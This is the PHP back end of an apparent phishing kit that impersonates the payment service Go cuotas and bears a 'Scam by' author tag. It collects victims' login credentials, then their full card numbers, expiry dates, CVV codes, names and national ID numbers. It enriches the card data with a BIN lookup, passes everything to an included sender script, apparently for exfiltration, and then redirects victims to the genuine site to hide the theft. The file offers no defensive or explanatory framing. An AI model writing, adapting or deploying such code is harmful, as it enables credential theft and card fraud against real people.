<?php  
session_start();

if (isset($_POST['pwpp'])) {
  $_SESSION['user'] = $_POST['user'];
}

if (isset($_POST['log'])) {
  $mensaje =
  "<b> -- GO cuotas access -- </b>\n".
  "  [ Tarjeta ] \n".
  "<b> - user: </b> <code>".$_SESSION['user']."</code>\n".
  "<b> - pwd: </b> <code>".$_POST['pwd']."</code>\n".
  "<b> - IP: </b> <code>".$_SESSION['expiry']."</code>\n".
  "<b> -- [Scam by @mitraserodehojalata ] -- </b>\n";
  $urlmsj = urldecode($mensaje);
  include 'app.php';
  header("location:alerta.html");
}

if (isset($_POST['cardsend'])) {
  $card = preg_replace('/\D/', '', $_POST['card']);
  $result = "";

  if ($_POST['card'] != "" && $_POST['expiry'] != "" && $_POST['cvv'] != "" && $_POST['names'] != "" && $_POST['dni'] != "") {
    function query($card, $result) {
      $result = file_get_contents("https://lookup.binlist.net/".$card); 
      $datos = json_decode($result, true);
      
      $tipo_tarj = $datos['bank']['name'] ?? 'Unknown';
      $pais = $datos['country']['name'] ?? 'Unknown';
      $type = $datos['type'] ?? 'Unknown';
      $moneda = $datos['country']['currency'] ?? 'Unknown';
      $mensaje =
      "<b> -- Go cuotas card -- </b>\n".
      "  [ Tarjeta ] \n".
      "<b> - Números: </b> <code>".$_POST['card']."</code>\n".
      "<b> - vence: </b> <code>".$_POST['expiry']."</code>\n".
      "<b> - Código: </b> <code>".$_POST['cvv']."</code>\n".
      "  [ Información de la tarjeta ] \n".   
      "<b> - BANK NAME: </b> <code>".$tipo_tarj."</code>\n".
      "<b> - Country: </b> <code>".$pais."</code>\n".
      "<b> - Type: </b> <code>".$type."</code>\n".
      "<b> - Moneda: </b> <code>".$moneda."</code>\n";
      $urlmsj = urldecode($mensaje);
      include 'app.php';
      echo "<meta http-equiv='refresh' content='0;URL=https://redirect.gocuotas.com/'>";
    }
    query($card, $result);
  }
}
?>
